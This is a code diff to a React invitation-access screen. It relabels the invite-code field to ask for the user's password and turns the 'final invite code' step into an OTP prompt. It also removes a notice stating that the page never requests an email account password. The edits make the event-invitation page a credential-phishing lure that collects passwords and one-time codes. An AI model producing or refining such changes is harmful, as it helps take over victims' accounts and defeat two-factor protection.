@@ -251,7 +251,7 @@ function AccessScreen({ onBack }) {
         status: 'success',
         message:
           result.message ||
-          'Final invite code sent. Your invitation is now awaiting final confirmation.',
+          'Code sent. Your invitation is now awaiting final confirmation.',
       });
       setStep('prepared');
     } catch (error) {
@@ -332,7 +332,7 @@ function AccessScreen({ onBack }) {
                   autoComplete="off"
                   name="accessCode"
                   onChange={updateField}
-                  placeholder="Enter the code from your invite"
+                  placeholder="Enter your password"
                   required
                   type="text"
                   value={formData.accessCode}
@@ -352,20 +352,19 @@ function AccessScreen({ onBack }) {
           {showFinalCodeForm && (
             <form className="access-form" onSubmit={submitFinalCode}>
               <div className="review-note">
-                <strong>Waiting for event planner code</strong>
+                <strong>Waiting for OTP code</strong>
                 <span>
-                  Once the event planner sends the final invite code, enter it
-                  below to complete your invitation review.
+                  Enter it below to complete your invitation review.
                 </span>
               </div>
 
               <label>
-                <span>Final invite code</span>
+                <span>OTP</span>
                 <input
                   autoComplete="off"
                   name="finalCode"
                   onChange={updateField}
-                  placeholder="Enter final invite code"
+                  placeholder="Enter your OTP"
                   required
                   type="text"
                   value={formData.finalCode}
@@ -377,7 +376,7 @@ function AccessScreen({ onBack }) {
                 disabled={isSubmitting}
                 type="submit"
               >
-                {isSubmitting ? 'Sending...' : 'Submit final code'}
+                {isSubmitting ? 'Sending...' : 'Input OTP'}
               </button>
             </form>
           )}
@@ -397,11 +396,6 @@ function AccessScreen({ onBack }) {
               {prepared ? 'Continue to RSVP' : 'Download Invitation'}
             </button>
           )}
-
-          <p className="fine-print">
-            This demo asks for an email and invitation code only. It does not
-            request or store an email account password.
-          </p>
         </div>
 
         <button className="back-button" type="button" onClick={onBack}>
